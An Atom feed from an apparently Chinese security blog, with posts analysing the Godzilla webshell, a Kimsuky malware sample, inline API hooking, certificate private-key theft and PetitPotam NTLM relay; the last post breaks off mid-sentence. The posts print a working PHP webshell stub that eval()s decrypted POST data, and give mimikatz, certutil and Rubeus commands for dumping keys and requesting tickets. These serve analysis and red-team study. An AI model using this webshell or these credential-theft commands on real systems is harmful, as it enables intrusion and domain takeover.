<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>九世的博客</title>
  
  
  <link href="http://422926799.github.io/atom.xml" rel="self"/>
  
  <link href="http://422926799.github.io/"/>
  <updated>2021-09-03T19:05:46.542Z</updated>
  <id>http://422926799.github.io/</id>
  
  <author>
    <name>九世</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>哥斯拉整体过程刨析</title>
    <link href="http://422926799.github.io/posts/befc239e.html"/>
    <id>http://422926799.github.io/posts/befc239e.html</id>
    <published>2021-09-03T13:27:25.000Z</published>
    <updated>2021-09-03T19:05:46.542Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要是分析哥斯拉流量协议实现的过程</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>版本:v1.0<br>有效荷载:Phpdynxxxxx<br>加密器:php_xor_base64</p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><pre><code class="php">&lt;?php    session_start();    @set_time_limit(0);    @error_reporting(0);    function E($D,$K){ //$D是base64解密后的数据,$K是key        for($i=0;$i&lt;strlen($D);$i++) {            $D[$i] = $D[$i]^$K[$i+1&amp;15]; //XOR解密数据        }        return $D;    }    function Q($D){        return base64_encode($D);    }    function O($D){        return base64_decode($D);    }    $P=&#39;pass&#39;;    $V=&#39;payload&#39;;    $T=&#39;3c6e0b8a9c15224a&#39;; //KEY    if (isset($_POST[$P])){ //检测密码字段是否存在POST请求        $F=O(E(O($_POST[$P]),$T)); //先base64解密数据，XOR运算解密数据，base64在解密xor解密后的数据        if (isset($_SESSION[$V])){ //检测SESSION是否存在 (对应SESSION 临时文件存放的shell)            $L=$_SESSION[$V]; //SESSION数据读取            $A=explode(&#39;|&#39;,$L); //分割|            class C{public function nvoke($p) {eval($p.&quot;&quot;);}} //执行命令            $R=new C();            $R-&gt;nvoke($A[0]); //调用nvoke函数            echo substr(md5($P.$T),0,16); //md5加密$p和$T，截断0到16位 （输出两次-&gt;开头&lt;data&gt;结尾）方便client提取返回内容            echo Q(E(@run($F),$T)); //输出结果            echo substr(md5($P.$T),16);        }else{            $_SESSION[$V]=$F;        }    }</code></pre><p>整体步骤如下：<br>1.一开始是没有session的，第一次把传过来的数据（大马）解密（base64_Decode-&gt;Xor_Decode-&gt;Base64_decode）写入到session，产生临时文件<br>    -&gt; Server返回带有session编号的cookie返回给client （ Example:Set-Cookie: PHPSESSID=064ef1kh9kjhmp9k46rvejh396; path=/）<br>    -&gt; Client接到带有PHPSESSID后，后续的请求都带上PHPSESSID<br>2.往后调用对应的功能pass字段就会调用对应大马里的函数</p><p>session产生的临时文件里的大马 （对应的脚本语言对应jar目录下的shells/payloads/<scriptname>/assets/）<br><img src="https://z3.ax1x.com/2021/09/03/hcEbUs.png" alt=""></scriptname></p><p>jeb反编译Godzilla.jar<br>定位到core/ui/component/dialog/ShellSetting.Class<br>在配置shell的时候步骤如下<br><img src="https://z3.ax1x.com/2021/09/03/hcEX80.png" alt=""></p><p>调用updateTempShellEntity更新模板对应的设置<br><img src="https://z3.ax1x.com/2021/09/03/hcVSrF.png" alt=""></p><p>initShellOpertion函数<br>(PayloadModel-&gt;对应你设置时选择的有效荷载，CryptModel-&gt;对应你设置时选择的加密器)</p><pre><code>* 返回http对象* 返回对应的payloadModel class对象* 返回对应的cryptModel class对象* 调用CryptModel.init函数* 调用payloadModel.init函数* 调用payloadModel.test函数</code></pre><p><img src="https://z3.ax1x.com/2021/09/04/hc6oVK.png" alt=""></p><p>getPayload函数<br><img src="https://z3.ax1x.com/2021/09/04/hc6bPe.png" alt=""></p><p>getCryption函数</p><p>这里加密器用的PhpXor对应shells/cryptions/phpXor/PhpXor.class<br>init函数</p><pre><code>* 返回http对象* 返回配置shell设置的密钥* 返回配置shell设置的密码* md5加密pass+key* 截断取0-16</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/09/7cb53e08b7bb685b.png" alt=""></p><p>check返回对应的状态<br><img src="https://i.bmp.ovh/imgs/2021/09/45892a92032b58d9.png" alt=""></p><p>这里分析的payloadModel对应shells/payloads/php/PhpShell.class</p><pre><code>* 返回http对象* 返回对应的shell编码</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/09/f99a65c395d7cd8e.png" alt=""></p><p>test函数<br>（发送test关键字-&gt;加密后，判断返回数据结果解密后是否存在ok，如果是则代表成功）<br><img src="https://i.bmp.ovh/imgs/2021/09/0af41e6126380b52.png" alt=""></p><p>evalFunc函数<br>获取对应的class name添加到 ReqParameter类型中，调用format返回base64编码后的结果，并开始拼接POST传输的参数，最后调用sendHttpResponse函数发送请求<br><img src="https://i.bmp.ovh/imgs/2021/09/77b11af83b4f41e1.png" alt=""></p><p>format函数<br><img src="https://i.bmp.ovh/imgs/2021/09/32314f9b3751fef5.png" alt=""></p><p>sendHttpResponse函数经过几重包装</p><pre><code>* 将上面base64编码的结果进行最终加密* 最后POST发送pass字段</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/09/98468b20d2285e45.png" alt=""></p><p>encode函数对应PHP_XOR_BASE64里的</p><pre><code>* 根据配置的密钥进行xor编码* 最后base64，拼接到pass字段</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/09/03ab31c2007cd287.png" alt=""></p><p>burp捕获配置时的三个包：<br>第一个发送大马数据，返回session ID<br><img src="https://i.bmp.ovh/imgs/2021/09/2507ef51b7a27ea5.png" alt=""></p><p>第二和第三个都是对应payload的test函数<br><img src="https://i.bmp.ovh/imgs/2021/09/706a3bd4df8d6d59.png" alt=""></p><p>完成这些步骤之后，调用对应的功能就是调用大马里对应的函数<br>参考链接:<a href="https://www.freebuf.com/sectool/285693.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/285693.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文主要是分析哥斯拉流量协议实现的过程&lt;/p&gt;
&lt;h2 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h2&gt;&lt;p&gt;版本:v1.0&lt;br&gt;有效荷载:Phpdynxxxxx&lt;br&gt;加密器:php_xor_</summary>
      
    
    
    
    
    <category term="工具刨析" scheme="http://422926799.github.io/tags/工具刨析/"/>
    
  </entry>
  
  <entry>
    <title>Kimsuky 间谍活动分析</title>
    <link href="http://422926799.github.io/posts/5c51f955.html"/>
    <id>http://422926799.github.io/posts/5c51f955.html</id>
    <published>2021-08-26T17:25:04.000Z</published>
    <updated>2021-08-26T17:39:05.501Z</updated>
    
    <content type="html"><![CDATA[<p>事件背景:韩国外交部文件及其通讯的诱饵<br>样本地址：<a href="https://www.virustotal.com/gui/file/a30afeea0bb774b975c0f80273200272e0bc34e3d93caed70dc7356fc156ffc3/detection" target="_blank" rel="noopener">https://www.virustotal.com/gui/file/a30afeea0bb774b975c0f80273200272e0bc34e3d93caed70dc7356fc156ffc3/detection</a><br><img src="https://z3.ax1x.com/2021/08/27/hKMneI.png" alt=""></p><p>type：Javascript<br>sha256：20eff877aeff0afaa8a5d29fe272bdd61e49779b9e308c4a202ad868a901a5cd<br>size：27.31 MB（28634023 字节）</p><p>一共有两段base64<br>打开是一段js解码base64写入诱饵pdf，第二段base64解码后在利用certutil解码得到UPX加壳的dll<br><img src="https://z3.ax1x.com/2021/08/27/hKMKTP.png" alt=""></p><p>regsvr32调用dll<br><img src="https://z3.ax1x.com/2021/08/27/hKMlY8.png" alt=""></p><p>诱饵PDF如下<br><img src="https://z3.ax1x.com/2021/08/27/hKMGlQ.png" alt=""></p><p>脱了UPX壳后的dll<br>sha256：ae50cf4339ff2f2b3a50cf8e8027b818b18a0582e143e842bf41fdb00e0bfba5<br>type：DLL x64<br>size：474.50 KB（485888 字节）<br><img src="https://z3.ax1x.com/2021/08/27/hKMJyj.png" alt=""></p><p>由于混淆严重，整体分析过程如下：<br><img src="https://z3.ax1x.com/2021/08/27/hKMYOs.png" alt=""></p><p>先反调试检查，遍历所有设备，查看对应设备的目录，然后提取.txt,hwp,.pdf,.doc,.xls,.ppt后缀的文件最后文件上传,键盘输入hook匹配到<br>指定的字符串写入到log.txt最后回传，注册表写入dll所在路径开机自启regsvr32<br><img src="https://z3.ax1x.com/2021/08/27/hKMfk6.png" alt=""></p><p>（反调试检查）<br><img src="https://z3.ax1x.com/2021/08/27/hKMo1e.png" alt=""></p><p>（遍历所有设备）<br><img src="https://z3.ax1x.com/2021/08/27/hKMq0I.png" alt=""></p><p>（获取C盘目录下的文件）<br><img src="https://z3.ax1x.com/2021/08/27/hKMjtf.png" alt=""></p><p>（搜索指定后缀的文件）<br><img src="https://z3.ax1x.com/2021/08/27/hKMvh8.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/08/27/hKQpcQ.png" alt=""></p><p>（键盘输入Hook，输入某些字符串匹配后写入到log.txt）<br><img src="https://z3.ax1x.com/2021/08/27/hKQ9Xj.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/08/27/hKQENV.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/08/27/hKQAA0.png" alt=""></p><p>（文件上传到远端）<br><img src="https://z3.ax1x.com/2021/08/27/hKQe9U.png" alt=""></p><p>参考链接:<a href="https://inquest.net/blog/2021/08/23/kimsuky-espionage-campaign" target="_blank" rel="noopener">https://inquest.net/blog/2021/08/23/kimsuky-espionage-campaign</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;事件背景:韩国外交部文件及其通讯的诱饵&lt;br&gt;样本地址：&lt;a href=&quot;https://www.virustotal.com/gui/file/a30afeea0bb774b975c0f80273200272e0bc34e3d93caed70dc7356fc156ffc3</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>Inline Hook研究</title>
    <link href="http://422926799.github.io/posts/3d0703bd.html"/>
    <id>http://422926799.github.io/posts/3d0703bd.html</id>
    <published>2021-08-18T17:31:25.000Z</published>
    <updated>2021-08-18T17:44:49.732Z</updated>
    
    <content type="html"><![CDATA[<p>Inline Hook是在程序调用某个API函数之前，在其上方设置指令跳转到自己写的的函数</p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>Hoo kMessageBox测试<br>x86思路如下:</p><pre><code>1.调用 GetModuleHandle 来获取到模块的基址(user32.dll)2.调用 GetProcAddress 获取到MessageBoxA弹窗的基址3.调用 VirtualProtect 来修改MsgBox前5个字节内存属性4.计算 Dest - MsgBox - 5 重定位跳转地址，并Jmp跳转5.计算 Dest + Offset + 5 = MsgBox +5 跳转回来</code></pre><p>疑问：为什么是5个字节？，jmp指令的机器码刚好5字节 </p><pre><code>E9 87 FE FF FF</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/08/5fa3973bebe61edb.png" alt=""></p><p>而在调用MessageBoxA API之前的保存栈堆新开堆栈时刚好够5字节（机器码共5个字节，<strong>这种情况适用于大部分API但并非全部API都适用</strong>）</p><pre><code>8B FF mov edi,pdi55 push ebp //新栈顶8B EC mov ebp,esp //保留堆栈Hook后这些指令就变成了一条jmp指令</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/08/e50facfac63f4c54.png" alt=""></p><p>最终在OD类似如下<br><img src="https://i.bmp.ovh/imgs/2021/08/639e3b28efd2c5ea.png" alt=""></p><p>x86内嵌asm hook实现如下：</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;windows.h&gt;#include &lt;stdio.h&gt;typedef int (WINAPI        *MessageBox_type) (               __in_opt HWND hWnd,               __in_opt LPCSTR lpText,               __in_opt LPCSTR lpCaption,               __in UINT uType);MessageBox_type RealMessageBox = MessageBoxA;//我们自己的MessageBox，每调用MessageBox都要跳到myMessageBox来处理_declspec(naked)  void WINAPImyMessageBox(        __in_opt HWND hWnd,        __in_opt LPCSTR lpText,        __in_opt LPCSTR lpCaption,        __in UINT uType){        __asm        {               PUSH ebp               mov ebp, esp               /*               vs2010 debug 编译后的代码由于要cmp esi esp来比较堆栈。               所以这里在调用非__asm函数前push一下esi               */               push esi        }        //下面打印MessageBox参数        printf(&quot;hwnd:%8X lpText:%s lpCaption:%s,uType:%8X&quot;, hWnd, lpText, lpCaption,  uType);        __asm        {               /*               vs2010 debug 编译后的代码由于要cmp esi esp来比较堆栈。               所以这里在调用非__asm函数前push一下esi               */               pop esi               mov ebx, RealMessageBox               add ebx, 5 //地址恢复避免重复hook               jmp ebx        }}#pragma pack(1)typedef struct _JMPCODE{        BYTE jmp;        DWORD addr;}JMPCODE, *PJMPCODE;VOID HookMessageBoxA(){        JMPCODE jcode;        jcode.jmp = 0xe9;//jmp        jcode.addr = (DWORD)myMessageBox - (DWORD)RealMessageBox - 5; //自己的函数地址-MessageBox基址-jmp指令大小        RealMessageBox = MessageBoxA;        ::WriteProcessMemory(GetCurrentProcess(), MessageBoxA, &amp;jcode, sizeof(JMPCODE),  NULL);}BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                                       ){        switch (ul_reason_for_call)        {        case DLL_PROCESS_ATTACH:               HookMessageBoxA();  //hook操作               MessageBoxA(NULL, &quot;HOOK&quot;, &quot;HOOKKKKKK&quot;, MB_OK);               break;        case DLL_THREAD_ATTACH:        case DLL_THREAD_DETACH:        case DLL_PROCESS_DETACH:               break;        }        return TRUE;}</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/08/3500eae2f47e893c.png" alt=""></p><p>x64如下<br>1.备份原来的指令<br>2.8个0x90替换为要跳转的函数地址<br>3.自己的函数中要执行的内容<br>4.恢复原来的指令</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;windows.h&gt;#include &lt;stdio.h&gt;BYTE oldcode[12] = { 0x00 };BYTE HookCode[12] = { 0x48, 0xB8, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xFF,   0xE0 };void HookFunction(LPVOID lpFunction) {        DWORD_PTR FuncAddress = (UINT64)GetProcAddress(GetModuleHandleA(&quot;user32.dll&quot;),  &quot;MessageBoxA&quot;);        DWORD offset = 0;        if (VirtualProtect((LPVOID)FuncAddress, 12, PAGE_EXECUTE_READWRITE, &amp;offset)) {               memcpy(oldcode, (LPVOID)FuncAddress, 12); // 拷贝原始机器码指令到oldcode               *(PINT64)(HookCode + 2) = (UINT64)lpFunction; //填充90为指定跳转地址    (0x90修改为要跳转的地址)        }        memcpy((LPVOID)FuncAddress, &amp;HookCode, sizeof(HookCode)); //拷贝hook指令        VirtualProtect((LPVOID)FuncAddress, 12, offset, &amp;offset); //还原页面保护属性}void UnHookFunction() {        DWORD offset = 0;        DWORD_PTR FuncAddress = (UINT64)GetProcAddress(GetModuleHandleA(&quot;user32.dll&quot;),  &quot;MessageBoxA&quot;);        if (VirtualProtect((LPVOID)FuncAddress, 12, PAGE_EXECUTE_READWRITE, &amp;offset)) {               memcpy((LPVOID)FuncAddress, oldcode, sizeof(oldcode)); //恢复原来的机器指令        }        VirtualProtect((LPVOID)FuncAddress, 12, offset, &amp;offset);//还原页面保护属性}int WINAPI TestMessageBoxA(HWND hwnd, LPCSTR lpText, LPCSTR lpcaption, UINT utype) {        UnHookFunction(); //取消hook        int ret = MessageBoxA(0, &quot;HOOK&quot;, &quot;title&quot;, MB_OK);        HookFunction((PROC)TestMessageBoxA); //继续hook        return ret;}BOOL APIENTRY DllMain(HMODULE hModule,        DWORD  ul_reason_for_call,        LPVOID lpReserved){        switch (ul_reason_for_call)        {        case DLL_PROCESS_ATTACH:               HookFunction((PROC)TestMessageBoxA);               break;        case DLL_THREAD_ATTACH:        case DLL_THREAD_DETACH:        case DLL_PROCESS_DETACH:               break;        }        return TRUE;}</code></pre><p>结果如下：<br><img src="https://i.bmp.ovh/imgs/2021/08/751af19c5be90b0c.png" alt=""></p><p>HookCode刨析：<br><img src="https://i.bmp.ovh/imgs/2021/08/b44d6d77e50cacb0.png" alt=""></p><p>x86话的HookCode为E9 00 00 00 00 （另外个执行例子）还需要减去5字节的便宜地址<br><img src="https://i.bmp.ovh/imgs/2021/08/0a49ec7f3aec9db7.png" alt=""></p><p>x86非内嵌asm，x86要将自己函数处理的地址-被Hook函数+5得出的偏移地址 (至于为什么我也不知道，原文写的不清不楚)</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;windows.h&gt;#include &lt;stdio.h&gt;BYTE oldcode[5] = { 0x00 };BYTE HookCode[5] = { 0xe9, 0x0, 0x0, 0x0, 0x0 };void HookFunction(LPVOID lpFunction) {        DWORD_PTR FuncAddress = (UINT32)GetProcAddress(GetModuleHandleA(&quot;user32.dll&quot;),  &quot;MessageBoxA&quot;);        DWORD offset = 0;        DWORD dfset = 0;        dfset = (DWORD)lpFunction - ((DWORD)FuncAddress + 5); //偏移地址计算        if (VirtualProtect((LPVOID)FuncAddress, 5, PAGE_EXECUTE_READWRITE, &amp;offset)) {               memcpy(oldcode, (LPVOID)FuncAddress, 5); // 拷贝原始机器码指令到oldcode               *(PINT32)(HookCode + 1) = (UINT32)dfset; //填充90为指定跳转地址    (0x90修改为要跳转的地址)        }        memcpy((LPVOID)FuncAddress, &amp;HookCode, sizeof(HookCode)); //拷贝hook指令        VirtualProtect((LPVOID)FuncAddress, 5, offset, &amp;offset); //还原页面保护属性}void UnHookFunction() {        DWORD offset = 0;        DWORD_PTR FuncAddress = (UINT32)GetProcAddress(GetModuleHandleA(&quot;user32.dll&quot;),  &quot;MessageBoxA&quot;);        if (VirtualProtect((LPVOID)FuncAddress, 5, PAGE_EXECUTE_READWRITE, &amp;offset)) {               memcpy((LPVOID)FuncAddress, oldcode, sizeof(oldcode)); //恢复原来的机器指令        }        VirtualProtect((LPVOID)FuncAddress, 5, offset, &amp;offset);//还原页面保护属性}int WINAPI TestMessageBoxA(HWND hwnd, LPCSTR lpText, LPCSTR lpcaption, UINT utype) {        UnHookFunction(); //取消hook        int ret = MessageBoxA(0, &quot;HOOK&quot;, &quot;title&quot;, MB_OK);        HookFunction((PROC)TestMessageBoxA); //继续hook        return ret;}BOOL APIENTRY DllMain(HMODULE hModule,        DWORD  ul_reason_for_call,        LPVOID lpReserved){        switch (ul_reason_for_call)        {        case DLL_PROCESS_ATTACH:               HookFunction((PROC)TestMessageBoxA);               break;        case DLL_THREAD_ATTACH:        case DLL_THREAD_DETACH:        case DLL_PROCESS_DETACH:               break;        }        return TRUE;}</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/08/2a7df4e7221353fb.png" alt=""></p><p>其他例子SetConsoleTitleW Hook<br><img src="https://i.bmp.ovh/imgs/2021/08/f41515400193bf8d.png" alt=""></p><p>Hook如下，一执行命令cmd的标题就会被更改<br><img src="https://i.bmp.ovh/imgs/2021/08/621519e81c080c2d.png" alt=""></p><p><strong>总的来说x86用内嵌asm，x64用memcpy插机器码</strong></p><h2 id="DetOurs库的使用"><a href="#DetOurs库的使用" class="headerlink" title="DetOurs库的使用"></a>DetOurs库的使用</h2><p>这玩意x64是商业版（<br>github地址:<a href="https://github.com/Microsoft/Detours" target="_blank" rel="noopener">https://github.com/Microsoft/Detours</a><br>下完进入到目录，用vs命令行的nmake编译。然后将lib和include添加到项目<br><img src="https://z3.ax1x.com/2021/08/19/f7sgvd.png" alt=""></p><p>Hook MessageBoxA</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;detours.h&gt;#pragma comment(lib,&quot;detours.lib&quot;)static INT(WINAPI *OldMessageBoxA)(HWND, LPCSTR, LPCSTR, UINT) = MessageBoxA; //定义被Hook的API函数原型INT WINAPI MyMessAgeBoxA(HWND, LPCSTR, LPCSTR, UINT) {        OldMessageBoxA(NULL, &quot;Hook&quot;, &quot;Title&quot;, MB_OK); //注意调用的被hook的函数时要使用自己定义的，否则会崩溃        return 0;}BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                                       ){        int ts;        switch (ul_reason_for_call)        {        case DLL_PROCESS_ATTACH:               ts = DetourTransactionBegin();               if (ts == NO_ERROR) {                       DetourUpdateThread(GetCurrentThread());                       DetourAttach(&amp;(PVOID&amp;)OldMessageBoxA, MyMessAgeBoxA);                       DetourTransactionCommit();               }               break;        case DLL_THREAD_ATTACH:        case DLL_THREAD_DETACH:        case DLL_PROCESS_DETACH:               break;        }        return TRUE;}</code></pre><p><img src="https://z3.ax1x.com/2021/08/19/f7sWDI.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/LyShark/p/11692436.html" target="_blank" rel="noopener">https://www.cnblogs.com/LyShark/p/11692436.html</a><br><a href="https://developer.aliyun.com/article/568432" target="_blank" rel="noopener">https://developer.aliyun.com/article/568432</a><br><a href="https://www.write-bug.com/article/1851.html" target="_blank" rel="noopener">https://www.write-bug.com/article/1851.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Inline Hook是在程序调用某个API函数之前，在其上方设置指令跳转到自己写的的函数&lt;/p&gt;
&lt;h2 id=&quot;实验&quot;&gt;&lt;a href=&quot;#实验&quot; class=&quot;headerlink&quot; title=&quot;实验&quot;&gt;&lt;/a&gt;实验&lt;/h2&gt;&lt;p&gt;Hoo kMessageBox测试</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>滥用证书私钥</title>
    <link href="http://422926799.github.io/posts/75f27601.html"/>
    <id>http://422926799.github.io/posts/75f27601.html</id>
    <published>2021-08-13T20:35:38.000Z</published>
    <updated>2021-08-13T21:16:56.646Z</updated>
    
    <content type="html"><![CDATA[<p>七夕放首老婆的歌</p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=484058598&auto=1&height=66"></iframe><p>原文链接：<a href="https://www.4hou.com/posts/w2og" target="_blank" rel="noopener">https://www.4hou.com/posts/w2og</a><br>安装证书服务就不说了，自己搜去弄</p><h2 id="理论知识"><a href="#理论知识" class="headerlink" title="理论知识"></a>理论知识</h2><blockquote><p>在传统的kerberos认证的时候，是使用用户密码进行认证的。回顾下申请TGT的过程。<br>用用户hash加密时间戳作为value，type为PA-ENC-TIMESTAMP， 放在PA_DATA上。KDC收到请求，使用用户hash解密value的值得到时间戳跟当前时间做比对，如果在合理的范围(正常五分钟)，就认证通过。<br>事实上也可以使用证书作为认证，这也是这次spectorops关于ADCS研究的最大亮点，后面漏洞紧紧围绕这点。<br>RFC4556引入了对 Kerberos 预身份验证的公钥加密支持。这个RFC 的title是Public Key Cryptography for Initial Authentication in Kerberos，后面我们使用简称PKINIT来介绍使用证书进行kerberos身份认证这种方法。<br>PKINIT同样也使用时间戳，但不是使用用户密码派生密钥加密消息，而是使用属于证书的私钥对消息进行签名。</p></blockquote><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>DC windows server 2019<br>AD CS Windows Server 2008<br>非域内机器windows 7</p><h2 id="测试准备"><a href="#测试准备" class="headerlink" title="测试准备"></a>测试准备</h2><p>certtmlp.msc - 证书模板控制台<br>certsrv.msc - 证书颁发机构<br>certmgr.msc - 证书管理</p><p>给一域用户安装个用户证书<br>win+r运行certmgr.msc，选择个人，右键，所有任务-&gt;申请新证书。请求证书选择用户（即可生成当前用户的一个证书）<br><img src="https://z3.ax1x.com/2021/08/14/fsXTFU.png" alt=""></p><p>安装后如下<br><img src="https://z3.ax1x.com/2021/08/14/fsX7YF.png" alt=""></p><p>执行certutil -user -store My可以看到用户证书<br><img src="https://z3.ax1x.com/2021/08/14/fsXLl9.png" alt=""></p><h2 id="场景模拟"><a href="#场景模拟" class="headerlink" title="场景模拟"></a>场景模拟</h2><p>假设一台域内机器带有一个用户证书要怎么利用他?<br>先把这个证书dump下来（需要包括私钥）可以用certutil或者直接用certmgr.msc dump</p><pre><code>certutil -user -exportPFX &lt;SHA1 hash&gt; test1.pfx</code></pre><p>（dump的时候需要给证书设置个密码(如果该证书默认没密码的话)）<br><img src="https://z3.ax1x.com/2021/08/14/fsXOyR.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/08/14/fsXXO1.png" alt=""></p><p>（使用certutil导出）<br><img src="https://z3.ax1x.com/2021/08/14/fsXzTK.png" alt=""></p><p>这里有一种情况不能通过这两种方式dump，有些证书在导入的时候需要密码或者<strong>不勾选标志此密钥为可导出的密钥</strong>，需要mimikatz dump<br><img src="https://z3.ax1x.com/2021/08/14/fsj9YD.png" alt=""></p><p>dump出现如下问题<br><img src="https://z3.ax1x.com/2021/08/14/fsjiSH.png" alt=""></p><p>使用mimikatz的crypto::capi修改lsass，然后在dump （这个报错也不影响，具体原因不知）<br>（这证书dump下来如果导入的时候设置了密码也没用，验证根本过不了，也不知道有啥用）</p><pre><code>crypto::capi #修改lsasscrypto::certificates /systemstore:local_machine /store:my /export</code></pre><p>（没以administrator权限执行）<br><img src="https://z3.ax1x.com/2021/08/14/fsjk6A.png" alt=""></p><p>（以administrator权限执行）<br><img src="https://i.bmp.ovh/imgs/2021/08/decd25cc3ceaa229.png" alt=""></p><p>尝试用Rubeus进行申请票据<br>知道证书密码或者dump证书的时候没设置不可dump可自己设置密码</p><pre><code>Rubeus.exe asktgt /user:csadmin /password:123456 /certificate:admin.pfx /domain:joker.local /dc:WIN-0ASLVBO5ID9.joker.local #123456是私钥密码(dump证书的时候设置的)</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/08/3f344d91d72244e3.png" alt=""></p><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>理论点<br><img src="https://i.bmp.ovh/imgs/2021/08/a735763c31d0fe83.png" alt=""></p><p><strong>在域内利用</strong><br>Rubeus.exe申请票据导入到当前进程，然后获取hash用wmiexec.py连接之类的<br>（清空原有的票据进行测试）<br><img src="https://i.bmp.ovh/imgs/2021/08/f4dd4b544a516e3e.png" alt=""></p><p>Rubeus进行申请票据<br><img src="https://i.bmp.ovh/imgs/2021/08/aa2df3a2f23d4cb5.png" alt=""></p><p>获取hash<br><img src="https://i.bmp.ovh/imgs/2021/08/3969335a61d64673.png" alt=""></p><p><strong>不在域内利用</strong><br>将pfx移动到win7，并导入证书。在hosts文件添加域控IP和加入被控制机器的IP和机器名或者DNS改为域控的IP （代理进内网）<br><img src="https://i.bmp.ovh/imgs/2021/08/ed2393d62b472888.png" alt=""></p><p>利用keke获取ntlm，然后用wmiexec.py连接之类的</p><pre><code>tgt::pac /subject:csadmin /castore:current_user /domain:joker.local</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/08/0cf25ddee50a166f.png" alt=""></p><p>直接利用mimikatz令牌注入用psexec连接AD CS服务器<br>（pth ntlm到新进程psexec连接）<br><img src="https://i.bmp.ovh/imgs/2021/08/c08063c93c568bc2.png" alt=""></p><h2 id="常见搜索证书的位置"><a href="#常见搜索证书的位置" class="headerlink" title="常见搜索证书的位置"></a>常见搜索证书的位置</h2><blockquote><p>我们经常可以在邮件，磁盘里面看到证书，我们一般按照后缀来搜索证书的，我们一般关注以下后缀<br>1、key后缀的，只包含私钥<br>2、crt/cer 后缀的，只包含公钥<br>3、csr后缀的，证书申请文件，不包含公钥，也不包含私钥。没啥用<br>4、pfx,pem,p12后缀的，包含公私钥，我们最喜欢的。<br>搜索文件后缀的每个人使用的工具不一样，我个人比较喜欢的是SharpSearch，.Net的项目，支持内存加载，可以写成CNA插件。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;七夕放首老婆的歌&lt;/p&gt;
&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot; height=&quot;86&quot; src=&quot;//music.163.com/outchain/p</summary>
      
    
    
    
    
    <category term="域渗透" scheme="http://422926799.github.io/tags/域渗透/"/>
    
  </entry>
  
  <entry>
    <title>使用PetitPotam到NTLM中继到域管理员</title>
    <link href="http://422926799.github.io/posts/d55c75ac.html"/>
    <id>http://422926799.github.io/posts/d55c75ac.html</id>
    <published>2021-08-07T11:57:32.000Z</published>
    <updated>2021-08-07T12:47:46.460Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>最近披露的几个漏洞，分别是：</p><ul><li>MS-EFSRPC – 又名 PetitPotam</li><li>滥用 AD CS 角色的凭证中继<br>任何具有内部网络访问权限的攻击者（例如网络中的网络钓鱼客户端或恶意植入设备）都可以在没有任何初始凭据的情况下接管整个 Active Directory 域。当前在默认配置中，域控制器和 AD CS 容易受到这种攻击。<br>当 PetitPotam 被利用并将 NTLM 凭据中继到 Active Directory 证书服务时，攻击者无需事先对域进行任何身份验证即可获得域管理员权限。本文将详细介绍漏洞利用所需的步骤，然后介绍 PetitPotam 的缓解措施。<br>攻击者可以使用 PetitPotam 触发域控制器以将 NTLM 凭据中继到所选主机。然后可以将域控制器的 NTLM 凭据中继到 Active Directory 证书服务 (AD CS) Web 注册页面，并且可以注册 DC 证书。然后可以使用此证书来请求 TGT（票证授予票证）并通过 Pass-The-Ticket 破坏整个域。<br>AD CS（Active Directory 证书服务）特别有趣，因为<strong>它提供默认接受基于 NTLM 的身份验证的角色服务。这些服务具体包括证书颁发机构 Web 注册和证书注册 Web 服务。</strong></li></ul></blockquote><h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><p>这几天踩的坑点：不能在DC安装AD证书服务进行测试，必须分开安装，具体情况是反射自身出问题还是什么不知道<br>DC: Windows Server 2019  IP:192.168.93.246<br>AD 